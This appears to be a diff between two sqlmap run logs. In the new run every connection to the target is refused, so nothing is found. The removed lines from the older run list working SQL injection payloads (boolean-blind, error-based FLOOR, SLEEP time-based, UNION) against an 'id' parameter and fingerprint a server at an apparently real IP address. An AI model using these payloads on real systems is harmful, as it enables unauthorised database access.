@@ -1,40 +1,300 @@
         ___
        __H__
- ___ ___[']_____ ___ ___  {1.3.2#stable}
-|_ -| . [.]     | .'| . |
-|___|_  ["]_|_|_|__,|  _|
+ ___ ___[)]_____ ___ ___  {1.3.2#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
       |_|V...       |_|   http://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[*] starting @ 15:07:05 /2023-02-24/
+[*] starting @ 17:31:41 /2023-04-25/
 
-[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[15:07:06] [INFO] resuming back-end DBMS 'mysql' 
-[15:07:06] [INFO] testing connection to the target URL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: id (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: id=1' AND 9386=9386 AND 'bdro'='bdro
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[17:31:42] [INFO] testing connection to the target URL
+[17:31:42] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:42] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch '--random-agent' and/or proxy switches ('--ignore-proxy', '--proxy',...)
+[17:31:42] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:42] [INFO] testing if the target URL content is stable
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:43] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
+[17:31:43] [INFO] testing if GET parameter 'id' is dynamic
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:43] [WARNING] GET parameter 'id' does not appear to be dynamic
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+there seems to be a continuous problem with connection to the target. Are you sure that you want to continue with further target testing? [y/N] N
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:43] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:43] [INFO] testing for SQL injection on GET parameter 'id'
+[17:31:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:43] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [INFO] testing 'MySQL inline queries'
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [INFO] testing 'PostgreSQL inline queries'
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [INFO] testing 'Oracle AND time-based blind'
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:44] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[17:31:45] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[17:31:45] [WARNING] GET parameter 'id' does not seem to be injectable
+[17:31:45] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
 
-    Type: error-based
-    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
-    Payload: id=1' AND (SELECT 6858 FROM(SELECT COUNT(*),CONCAT(0x7178716a71,(SELECT (ELT(6858=6858,1))),0x7170716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'QVQT'='QVQT
-
-    Type: AND/OR time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind
-    Payload: id=1' AND SLEEP(5) AND 'FCAg'='FCAg
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: id=-7452' UNION ALL SELECT NULL,NULL,CONCAT(0x7178716a71,0x6b4d44456952666765456941724e6d79646a77714273546d795862466c62574c4f5773496962646c,0x7170716b71)-- MqfS
----
-[15:07:07] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux CentOS 7-1708
-web application technology: Apache 2.4.6, PHP 7.0.33
-back-end DBMS: MySQL >= 5.0
-[15:07:07] [INFO] fetched data logged to text files under '/root/.sqlmap/output/47.94.106.197'
-
-[*] ending @ 15:07:07 /2023-02-24/
+[*] ending @ 17:31:45 /2023-04-25/
 
